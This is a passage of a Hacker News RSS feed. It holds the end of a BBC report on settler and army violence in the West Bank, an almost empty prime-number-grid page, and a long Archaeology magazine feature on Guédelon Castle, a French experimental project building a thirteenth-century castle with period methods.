src="https://ichef.bbci.co.uk/news/480/cpsprodpb/b8d4/live/564eda40-7c0e-11f0-ab3e-bd52082cd0ae.jpg.webp" loading="lazy" alt="Fred Scott/BBC Mother of 18-year-old Hamdan Abu-Elaya cries at his funeral, after he was shot and killed by Israel troops"><span>Fred Scott/BBC</span></p></div><p data-component="caption-block"><figcaption>Mother of 18-year-old Hamdan Abu-Elaya cries at his funeral, after he was shot and killed by Israel troops</figcaption></p></figure><div data-component="text-block"><p>Tensions between local residents and settlers are complicated by the increasingly heavy control of Israeli forces across the West Bank, which has seen the evacuation and widespread demolition of refugee camps across the northern West Bank.</p><p>From January to June this year, the UN found that 149 Palestinians were killed by Israeli settlers or soldiers in the occupied West Bank.  Nine Israelis were killed by Palestinians.</p><p>Hours after the clashes that erupted around Brahim's farm on Saturday, another Palestinian casualty was added to that grim tally.</p><p>Eighteen-year-old Hamdan Abu-Elaya was shot and killed by Israeli troops in al- Mughayyir village, a few miles from Brahim's field.</p><p>His mother told us he'd gone to see the fires lit by settlers nearby.  "I raised him for 18 years, and he was gone in a minute," she said.</p><p>We asked the Israeli army what happened.  It said "terrorists" had thrown rocks and Molotov cocktails at troops in the village, and that soldiers had "responded with fire to remove the threat".</p><p>Hundreds crowded into Hamdan's house for his funeral on Sunday, as his body was carried in for his mother to say goodbye.</p><p>His father, Ameen Abu Elaya, raging to friends and family, said he refused to show the Israelis his tears.</p><p>"They thought if they killed our son, we would leave," he said. "I will not shout and scream and say 'why has he gone?'  I'm not sad that he passed. I encourage young men to do anything they can against the criminal occupier."</p><p>At the local mosque, there was a hero's welcome for Hamdan's body as it was carried in for the funeral prayer – vast Palestinian flags hung alongside those of Fatah and Hamas from the roofs and windows; crowds lining the path of the bier.</p><p>In the language of this conflict, each birth and each burial only strengthens the ties to the land.</p><p><i id="additional-reporting-by-morgan-gisholt-minard">Additional reporting by Morgan Gisholt Minard</i></p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Prime Number Grid (243 pts)]]></title>
            <link>https://susam.net/primegrid.html</link>
            <guid>44949162</guid>
            <pubDate>Tue, 19 Aug 2025 07:33:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://susam.net/primegrid.html">https://susam.net/primegrid.html</a>, See on <a href="https://news.ycombinator.com/item?id=44949162">Hacker News</a></p>
<div id="readability-page-1" class="page">
    <p><label for="start">Start</label>
      
    </p>
    <p><label for="rows">Rows</label>
      
    </p>
    <p><label for="cols">Cols</label>
      
    </p>
    
    
    
    
  

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to Build a Medieval Castle (191 pts)]]></title>
            <link>https://archaeology.org/issues/september-october-2025/features/how-to-build-a-medieval-castle/</link>
            <guid>44948352</guid>
            <pubDate>Tue, 19 Aug 2025 04:49:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://archaeology.org/issues/september-october-2025/features/how-to-build-a-medieval-castle/">https://archaeology.org/issues/september-october-2025/features/how-to-build-a-medieval-castle/</a>, See on <a href="https://news.ycombinator.com/item?id=44948352">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
                      
<p><strong>Sometimes it takes a village</strong> to raise a window. Between 2015 and 2017, skilled masons meticulously carved and beveled arches and four-lobed flourishes for a Gothic-style stone window frame in Guédelon Castle’s ornate Chapel Tower. All that remained was to install some glass. But there was a problem, and the carpenters, painters, blacksmiths, basket weavers, historians, and archaeologists who work on-site were all enlisted to figure it out. Eight years later, the matter of what to put in the window of a medieval castle has nearly been resolved…maybe.</p>



<p>Luckily, the team of 40 professional builders and craftspeople at Guédelon Castle love a conundrum. The castle, located in an abandoned quarry in the Puisaye region of Burgundy, 100 miles southeast of Paris, is the site of one of the world’s most comprehensive and longest-running experimental archaeology projects. In this kind of undertaking, archaeologists partner with skilled laborers to test hypotheses about how people worked, lived, and built in the past, filling gaps in academic knowledge through real-world trials. The project launched in 1998 with a straightforward mandate: Build a thirteenth-century castle using only thirteenth-century tools, techniques, and materials. Medieval archaeologists would provide guidance. And the hope was that every obstacle would reveal something that historians, architectural researchers, archaeologists, and <em>castellologues</em>, or scholars who specialize in studying castles, didn’t know. “At Guédelon, we’re looking for what disappeared in traditional archaeology,” says Florian Renucci, the master mason and longtime site director at Guédelon, who was formerly a researcher at Sorbonne University. “Experimental archaeology means bringing to life what workers can do. We’re always looking, hearing, feeling. Now, with our work, the castle can speak.”</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572ccd682&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="679" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-Guedelon-Castle-Aerial-1024x679.jpg" alt="" data-image-credit="© D. Gliksman" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-Guedelon-Castle-Aerial-1024x679.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-Guedelon-Castle-Aerial-300x199.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-Guedelon-Castle-Aerial-768x509.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-Guedelon-Castle-Aerial.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Guédelon Castle, in the Puisaye region of north-central France, represents a modern effort to build a thirteenth-century castle using only construction materials and techniques employed by medieval builders and artisans. After several decades, masonry work on the castle’s Chapel Tower (top left) and the adjoining Great Hall is now complete.</figcaption></figure>



<p>The first thing the castle said about windows is that they couldn’t have been made of glass. Guédelon’s artisans and committee of scientific advisers are constantly scouring medieval texts for clues about how thirteenth-century builders would have handled such details. In the castle’s imagined backstory, the fictitious seigneur, or lord, of Guédelon was a cash-conscious minor noble trying to make a home in 1228, putting him—and today’s builders of Guédelon—at the mercy of his financial circumstances. In that era, glass was extraordinarily expensive and reserved for places of worship and royal residences. Glasswork, the team learned, swallowed up half the cost of building a cathedral. Unfortunately, whatever material was used to fill the window frames of lesser edifices has left no traces in the archaeological record.</p>



<p>Artisans, many wearing period garb, initially tried to fashion goatskin panels for the Chapel Tower window after learning that this material had been used in contemporaneous buildings—but the panels warped in the winter frost and cracked in the summer heat. The team then reviewed a list of prices for the materials used to build the Palais des Papes, or Palace of Popes, in Avignon, which was begun in 1252. They learned that humble linen, stiffened with beeswax, once covered some windows at this grandest of châteaus. Valérie Lachény, Guédelon’s master painter, decorated linen canvases with an eye-catching design of golden oak leaves ensconced in maroon semicircles—a pattern inspired by twelfth-century stained glass at Strasbourg Cathedral in northeastern France. In spring 2025, three painted linen panels could be found propped in her workshop, each waiting to be affixed between wooden frames engineered by the castle’s carpentry atelier to fit into the tower’s stone window molds. Each frame takes 150 hours to join, rasp, carve, and assemble.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572ccdd5a&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="306" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-1024x306.jpg" alt="" data-image-credit="Ben O’Donnell; © Ralph Hammann/Wikimedia Commons; Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-1024x306.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-300x90.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-768x229.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Decorated linen window panels (left) stand in the Guédelon painters’ atelier, awaiting installation in the Chapel Tower. Patterns from twelfth-century stained glass at Strasbourg Cathedral (middle) inspired the panels’ designs. One linen panel (right) in the Great Hall’s antechamber has already been put in place.</figcaption></figure>



<p>Meanwhile, an ongoing debate about how to fasten the linen to the frames rages. Guédelon’s blacksmiths have forged bespoke iron tacks, but, as carpenter Simon Malier explains, this option for attaching the fabric requires finesse, lest the wood crack. The basket weavers have suggested sewing the linen into the frames with a cow-horn needle. “For this kind of thing,” Malier says, “it’s a team effort.” Whatever method wins out, when the window is finally mounted, the waxed linen exterior will be brushed with flaxseed oil to protect it—which may or may not work. Recently, Malier says that he, Renucci, and Lachény stumbled on a snippet of medieval text describing a tantalizing linen window coating that shines “like crystal.” “But we don’t have the bloody recipe!” he laments.</p>



<p>“Because the Guédelon team works in the conditions of thirteenth-century laborers, they discover techniques that people were figuring out at that time,” says archaeologist and Guédelon project scientific committee member Nicolas Faucherre of Aix-Marseille University. “That’s why Guédelon is so important for archaeologists.” Every detail must be considered, and there are no shortcuts. The site is an unparalleled experimental archaeology project and may remain never-quite-finished forever. By observing the work of the castle’s “medieval” builders, archaeologists and other scholars have discarded old ideas and hatched new ones about how monuments of the era were created. They have solved mysteries about how ceramic for tiles was mixed and fired, how lime mortar was troweled to hold structures fast and make them last, and how scaffolding was erected to reach dizzying heights. Some discoveries may seem esoteric, but each one can help refine scholars’ understanding of tens—or even thousands—of medieval sites.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572cce332&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="691" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Map-1024x691.jpg" alt="" data-image-credit="Ken Feisel" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Map-1024x691.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Map-300x202.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Map-768x518.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Map.jpg 1038w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p><strong>In 1995</strong>, Faucherre and archaeologist Christian Corvisier found something quite striking while studying Saint-Fargeau Castle, 5.5 miles northwest of Guédelon. The château there was built from the fifteenth through the seventeenth century, but the archaeologists discerned the foundations of a smaller, earlier fortification with thirteenth-century characteristics beneath it. The château’s owner, Michel Guyot, became intrigued by the prospect of rebuilding the earlier structure. So, he bought the disused quarry in Guédelon Forest in the commune of Treigny and embarked on the adventure with cofounder Maryline Martin, a young businessperson. Instead of imitating Saint-Fargeau Castle, they decided, the new structure would be an original, loosely following the model of Ratilly Castle, which had been built around 1270 just two miles south.</p>



<p>“When I came here for the first time, it was just forest,” says Martin, who is now the owner of Guédelon. “But we had a lot of luck.” The forest, 370 acres of which belong to Guédelon, has ample oak for timber, a lode of iron-streaked sandstone that serves most of the masons’ and blacksmiths’ needs, and seemingly bottomless pockets of colorful minerals for the painters to extract pigments from. “It’s incredible for me to imagine how many solutions we have just within sight,” Martin says.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572cce918&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="659" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Chapel-Tower-Vault-1024x659.jpg" alt="" data-image-credit="© Guédelon" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Chapel-Tower-Vault-1024x659.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Chapel-Tower-Vault-300x193.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Chapel-Tower-Vault-768x494.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Chapel-Tower-Vault.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Masons work to construct the Chapel Tower’s stone ceiling vault over a wooden framework without the use of iron or concrete.</figcaption></figure>



<p>The first years at Guédelon were strenuous and invigorating, long days testified in chisel marks on stone, ax splits on timber, and strokes on sketch pads. It took three years to build the 11.5-foot-thick foundation walls, which trace a perimeter of 660 feet. Many of the original laborers were unemployed, some with past legal difficulties, and had been left behind in a place where most factories and quarries had shuttered, and even the railroad had ceased running long before. As Martin recalls, quarriers would etch their encouragement on blocks passed to the masons. “Only ten to go! Only nine to go!” read inscriptions on some stones. In 1998, the construction site opened to curious visitors, and 300,000 now come each year, 60,000 of whom are schoolchildren. The castle, and everything else Guédelon includes, encompasses a self-sustaining business, funded by ticket sales, an on-site restaurant, and a gift shop.</p>



<p>Amid innumerable false starts and experiments gone awry, Guédelon Castle began to rise. Between 2000 and 2017, Renucci and his team executed four different styles of medieval ceiling vault—mostly to see if they could—all without any ahistorical reinforcement from iron or concrete. By 2010, the carpenters had lifted magnificent timber trusses over the castle’s Great Hall and living quarters, and soon Guédelon’s grounds included gardens, stables, a water mill, and 10 workshops.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572cceeac&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="683" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Compass-Work-1024x683.jpg" alt="" data-image-credit="© Guédelon" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Compass-Work-1024x683.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Compass-Work-300x200.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Compass-Work-768x512.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Compass-Work.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Master mason Florian Renucci traces an arch with a version of a thirteenth-century compass.</figcaption></figure>



<p><strong>The Puisaye skies</strong> threaten rain, as they often do in April, but excitement is in the air. Guédelon opened for the season just a few weeks ago. Stonemasons have completed two of the castle’s four corner towers using the area’s brilliant burnt-orange sandstone. The table is set in the Great Hall under a lofty oak-timber barrel vault. Painters have adorned the hall’s antechamber with willowy vines and cheery flowers dancing around stone blocks. The carpenters have even mounted a linen window there—it seems to be faring well thus far. Beyond the castle walls, a blond-maned horse makes light work of pulling an empty cart, and kids stop to gawk at the “squirrel cage,” a leviathan treadmill winch atop the south curtain wall. Inside this human hamster wheel, masons trudge in pairs to power a pulley that lifts blocks and mortar up to the parapet they’re finishing.</p>



<p>Renucci is at the castle this morning as usual, but there’s no such thing as an ordinary day for the master mason. He has to sketch and resketch all plans by hand, troubleshoot glitches with archaeologists around the country, convene weekly meetings of artisans to hear their latest updates and bon mots, and oversee all construction and craft operations. Renucci, who helped restore Paris’ iconic sixteenth-century bridge, the Pont Neuf, first donned a period-appropriate tunic and capelet for his role at Guédelon in 1998. Today, the clanking of the quarriers and the whoosh of the forge bellows tell him the morning has begun smoothly, so he’ll take a lap around the castle to check on progress.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572ccf441&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="631" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Mill-Water-Wheel-1024x631.jpg" alt="" data-image-credit="Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Mill-Water-Wheel-1024x631.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Mill-Water-Wheel-300x185.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Mill-Water-Wheel-768x474.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Mill-Water-Wheel.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The water wheel in the castle’s mill rotates a massive axle, following the design of a twelfth-century mill discovered in Thervay, 160 miles east of Guédelon.</figcaption></figure>



<p>He strides out from the burly two-tower main gatehouse and scrambles down to the exterior foundations of the Chapel Tower. With his measuring stick—articulated in both modern centimeters and the inches and feet thirteenth-century masons used, which are almost identical to today’s—Renucci gestures at a section of Guédelon’s very first wall. The stone blocks here are precisely fitted and smoothly dressed, a visible contrast with the rest of the walls’ masonry. It looks as though stoneworkers had begun building a different castle entirely. “When we started, we tried to make the stones very uniform, very planned, because we learned at masonry school that this is a better way,” Renucci says. But each stone took two days to cut and dress. In the thirteenth century, masons usually collected their fees in weeks worked, not stones cut. Could the budget-conscious seigneur of Guédelon really have afforded this? Did he have time to wait for a roof over his head and walls to protect his family?</p>



<p>As he has done countless times over his Guédelon career, Renucci looked to France’s wealth of medieval archaeology. In its imagined story, Guédelon was founded just after the rule of Philip II (reigned 1180–1223), the first ruler to style himself king of France. Philip doggedly expanded the throne’s domain to include most of the area under the French flag today, in part through a campaign of building defensive fortifications in a signature Philippian style that his vassals mimicked. Around 100 such fortresses survive in France, a primary reason that 1228 was the date chosen to establish Guédelon. One Philippian castle stands largely unmodified in Dourdan, just southwest of Paris, and “predates” Guédelon by just a few years. The walls of Dourdan Castle, Renucci noticed, were faced with irregular, roughly dressed blocks, inspiring him to alter his course. “When we changed methods, we were able to make four stones in one day,” he says. “Our mindset today is to take your iPhone and say, ‘Can I order wood or stone in 20 hours?’ The primary challenge of building Guédelon is to forget the twenty-first century.”</p>



<p>Renucci heads back into the castle, climbs a spiral staircase, and follows the wall-walk to the stonemasons’ pièce de résistance for 2025, the upper level of the gatehouse. Above the gate, masons and carpenters will soon add an arch, a lintel, a portcullis, and a “murder hole”—a maw through which defenders could throw rocks and pour hot pitch on marauders. The design of the 2,000-pound portcullis is an educated guess; there are no working thirteenth-century originals left. Faucherre, who is studying the medieval Louvre Castle in Paris and the Aigues-Mortes ramparts in the south of France for inspriation, was flummoxed by the question of how a portcullis counterweight mechanism would have functioned at these sites. But his conversations with the Guédelon team this year have helped him envision the machines. “We can never be sure,” Faucherre says, “but now we are obliged to make a portcullis that can move.”</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572ccfa52&quot;}" data-wp-interactive="core/image"><img decoding="async" width="762" height="1024" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Great-Hall-Church-Motifs-Combo-762x1024.jpg" alt="" data-image-credit="Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Great-Hall-Church-Motifs-Combo-762x1024.jpg 762w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Great-Hall-Church-Motifs-Combo-223x300.jpg 223w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Great-Hall-Church-Motifs-Combo-768x1032.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Great-Hall-Church-Motifs-Combo.jpg 893w" sizes="(max-width: 762px) 100vw, 762px"><figcaption>Painted motifs in the antechamber of the Great Hall (top) include golden vines, reddish-orange flowers, and a braided-ribbon pattern that mimic designs (above) in a medieval church in nearby Moutiers-en-Puisaye.</figcaption></figure>



<p>The murder hole will remain purely ornamental. “This is a very pacifist castle,” laughs stonemason Yaniv Gammeter. “Very anti-violence here.” In truth, local Guédelon-size Philippian castles such as those at Ratilly, Druyes, and Saint-Vérain weren’t equipped for serious warfare. “You can view these castles as a type of very large manor house,” Gammeter says. “They’re symbols of power but weren’t meant to survive a siege.”</p>



<p><strong>As Guédelon has grown</strong>, so have the possibilities. Why stop at a castle? In the thirteenth century, people here would have painted, prayed, farmed, milled flour, fell ill, recovered, and listened to the leaves and birds to get the day’s weather report. Vanishingly little evidence of those activities can be found by excavating, and thus the artisans and researchers at Guédelon have to get creative. Lachény, the painter, has concocted no fewer than 17 pigments from local ores and plant material, some of which she’s found in the forest herself. While retrieving a bowl of fine dark ocher powder from her oven, she explains that glands on cherry tree leaves, when crushed, boiled, and made into paste, produce a reddish-black hue. In their atelier, the painters glide around color-spattered stacks of mixing bowls, shelves of ceramics, swatches of linen, and trays of yellow, pink, gray, and blue powders. New colors occasionally arrive unannounced. “Sometimes a quarryman cleaving stones comes over saying, ‘I found this,’” says Lachény, who investigates whether the discovery can be useful for her work or for some other endeavor in the castle.</p>



<p>Twelfth- and thirteenth-century wall paintings rarely survive, but some of the most intact examples in France can be found in the Church of Saint Peter and Saint Paul in Moutiers-en-Puisaye, just two miles from Guédelon. Around images of angels, saints, and Adam and Eve, medieval masters enlivened the walls with bright orange flowers, slate-blue stars, and unruly golden vines, motifs that inspired Lachény’s decoration of the Great Hall’s antechamber. “It’s got plenty of spirit, it’s joyful,” she says. “We talk about Dark Ages, but the Middle Ages were really colorful.”</p>



<p>The Middle Ages were also noisy, and sound has proven crucial to the successful construction of a thirteenth-century water mill, one of Guédelon’s more daunting experiments. In 2008, a rescue excavation turned up two medieval mills in eastern France near the village of Thervay. An exceptional trove of 200 wood fragments was preserved from one mill. Using these fragments as their guide, Guédelon’s carpenters spent two years fabricating their own mill. It croaked and creaked, but nevertheless, the millstones barely budged. The miller, Constantin Lemesle, decided to let it run until wood started snapping. “If we don’t make mistakes, we can’t understand the machine,” he says. With a working design on the first try, the mill would have produced plenty of flour but no knowledge. Finally, Lemesle says, the mill is singing.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572cd00d6&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="683" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Treadmill-1024x683.jpg" alt="" data-image-credit="Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Treadmill-1024x683.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Treadmill-300x200.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Treadmill-768x512.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Treadmill.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>A huge treadmill powered by pairs of workers who trudge inside it drives a pulley
that lifts stone blocks and mortar up to the parapet of the castle’s curtain wall.</figcaption></figure>



<p>In the past decade, as Guédelon has evolved with endeavors such as the mill, more scientists have come to see and hear all the commotion. Mylène Pardoën, a soundscape archaeologist at the Center of Social Sciences and Humanities, Lyon Saint-Étienne, has visited Guédelon 23 times since 2020 with her arsenal of microphones, which she pokes into the millstones, the cracking quarry slabs, and the fires of the forge. “The thirteenth century sounds different, and every material transmits information,” she says. In 2023, relying almost entirely on data collected at Guédelon, Pardoën composed a four-minute surround-sound reconstruction of the building site of Paris’ Notre Dame Cathedral circa 1170.</p>



<p><strong>After 11 years</strong> of repeatedly fixing Guédelon’s finicky grain-crunching contraption, Lemesle can imagine the whole medieval community’s relationship to the mill. The seigneur collected taxes in the spring for its operation. Peasants in the fiefdom could bake or buy abundant, nutrient-rich bread, leaving time to raise animals and plant crops, an investment toward an energetic summer dedicated to working the fields. In years when the skies failed to provide rain, flour would have to be milled by animal or manual labor, and there’d be fewer hands to, say, build a castle.</p>



<p>How groups and systems functioned or fell apart in the Middle Ages is what the work at Guédelon illuminates above all else for archaeologists. “We’re putting pieces into a big puzzle,” says archaeologist Anne Baud of Lumière University Lyon 2, director of excavations at Cluny Abbey in east-central France. This abbey was enormous, its twelfth-century basilica’s vaults rising nearly 100 feet—then the highest in Western Europe. Nothing like it had ever been built. “You would think there must have been hundreds and hundreds of builders who were working there,” says Baud. “But is that true?” At Guédelon, she and other archaeologists have observed that medieval labor was likely leaner, more collaborative, and more synchronized than accounts of the time suggest. “The empirical knowledge we gain,” Baud says, “is linked to Guédelon’s laborers’ experience.”</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572cd0737&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="625" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Ratilly-Castle-1024x625.jpg" alt="" data-image-credit="Hervé Lenain/Alamy" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Ratilly-Castle-1024x625.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Ratilly-Castle-300x183.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Ratilly-Castle-768x469.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Ratilly-Castle.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Ratilly Castle was built around 1270 two miles from Guédelon and provided a model for the new castle’s plan.</figcaption></figure>



<p><strong>The Guédelon project</strong> and its artisans have begun to make their mark on restoration efforts across France. When Notre Dame Cathedral burned in 2019, the team was summoned for their highest-profile contribution. (See “<a href="https://archaeology.org/issues/march-april-2022/features/notre-dame-restoration/" target="_blank" rel="noreferrer noopener">Exploring Notre Dame’s Hidden Past</a>.”) Renucci, along with six of Guédelon’s carpenters, set off to help rebuild the Forest, the immense timber framework of the cathedral’s roof. Conventional wisdom held that clear-cutting and drying centuries-old oaks would be required to replicate the original structure. But the Guédelon carpenters knew better. They’d built a formidable oak trusswork for Guédelon’s Great Hall several years earlier, learning that smaller, younger oaks, freshly cut and green with moisture, were more pliable. The crew brought along 60 custom-fitted medieval axes, forged at their castle, to equip the Forest’s carpenters. “I’m very proud of this,” says Martin, Guédelon’s proprietor. “It’s necessary to have dreams together.”</p>



<p>No one expects the Guédelon reverie to end any time soon. Baud and Renucci are now hashing out plans for a Guédelon church in the forthcoming Guédelon village, which is still on the drawing board. On a sunny afternoon, Renucci stops by Ratilly Castle for ideas. He traces the courses of stone, pulls weeds from cracks in the mortar, and inspects long-ago quarrier’s marks and scaffolding holes. He starts to forget the twenty-first century, his mind on gates and portcullises and spectral guards heaving them open and clanging them shut. The castle’s centuries-old knotty oak door, heavy with a mess of iron bolts and locks, catches his eye. “Very interesting, this kind of system,” Renucci muses, snapping a photo of an entryway he has walked through dozens of times. “You come for stone, and you notice wood. That’s the magic thing about a castle.”</p>


<div id="guedelon-slideshow">
    

<p>Slideshow: Building the Last Medieval Castle</p>



<p><strong>Philip II</strong>, the first ruler to style himself king of France, reigned from 1180 to 1223, but some of the 100 or so surviving French castles designed in the Philippian style postdate the king’s death by decades. In fact, work on the newest example of the style, Guédelon Castle, began in 1998. In the quarter-century since construction started in the forested Puisaye region of Burgundy, Guédelon has become one of the world’s most comprehensive and longest-running experimental archaeology projects. Everything done on site, from mixing lime mortar to cutting timber beams to weaving baskets, uses only thirteenth-century tools, techniques, and materials. Guédelon’s 40 stonemasons, woodcutters, weavers, painters, blacksmiths, and other artisans draw inspiration from contemporaneous sites and texts. Each obstacle they encounter is an opportunity to solve a problem, medieval-style, and to fill a gap in archaeologists’ knowledge of the era.</p>



<figure><figure><img decoding="async" width="1024" height="575" data-id="52309" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigeon-Tower-Cupola-1024x575.jpg" alt="" data-image-credit="© Guédelon" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigeon-Tower-Cupola-1024x575.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigeon-Tower-Cupola-300x169.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigeon-Tower-Cupola-768x432.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigeon-Tower-Cupola.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>In 2023, carpenters and tilers completed the cupola atop Guédelon Castle’s Pigeon Tower (shown under construction in foreground). Each year, the castle’s builders focus on a handful of architectural elements, but only about half of the job concerns sticks and stones. The other half involves demonstrating and explaining medieval work to the 300,000 visitors who come annually. It may be taking much longer to build Guédelon than it did to build castles 800 years ago, but at least there aren’t as many sieges to deal with these days.</figcaption></figure>


